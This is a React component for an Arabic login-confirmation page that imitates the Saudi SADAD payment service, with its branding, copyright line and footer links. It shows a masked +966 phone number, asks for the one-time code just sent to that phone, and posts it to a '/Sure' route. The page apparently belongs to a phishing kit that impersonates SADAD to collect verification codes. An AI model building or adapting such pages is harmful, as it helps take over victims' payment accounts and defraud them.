import React from 'react'
import Nav from './Nav'

const User = () => {
    return (
        <div className='container'>
            <Nav />
            <div className="section-two">
                <p><a href="/">الرئيسيه</a>/شخصي</p>
                <h1> تسجيل الدخول</h1>
            </div>
            <div className="section-three">
                <h3>تأكيد </h3>
                <p>ادخال الكود المرسل حديثا على رقم هاتفك</p>
            </div>
            <form action="/Sure" id="login-form" class="login-form">
                <div class="form-group">
                    <label class="" for="form-password">اسم المستخدم</label>
                    <input type="pass" class="form-control" name="pass" id="pass" placeholder="+966**********" required readonly="" style={{ textAlign: "end" }} />
                </div>
                <div class="form-group">
                    <label class="" for="form-password"> كلمة السر المؤقتة</label>
                    <input type="number" class="form-control" name="pass2" id="pass" placeholder="كلمة السر المؤقتة" required  style={{ textAlign: "end" }} />
                </div>
                <button type="submit" class="btn btn-primary btn-large" title="دخول" name="send" id="send2">
                    دخول
                </button>
            </form>
            <div className="section-four">
                <p>One solution for all payments</p>
                <div className="links">
                    <a href="#" target={"_blank"}></a>
                    <a href='#' target={"_blank"} className='youtube'></a>
                </div>
            </div>
            <div className="section-five">
                <p>.سداد حقوق الطبع والنشر 2022. جميع الحقوق محفوظة</p>
                <div className="footer">
                    <a href="/">الأسئلة المتكررة </a>
                    <a href="/">تنويه</a>
                    <a href="/">سياسة الخصوصية </a>
                    <a href="/">شروط الاستخدام </a>
                    <a href="/">اتصل بنا</a>
                    <a href="/">خريطة الموقع</a>
                </div>
            </div>
        </div>
    )
}

export default User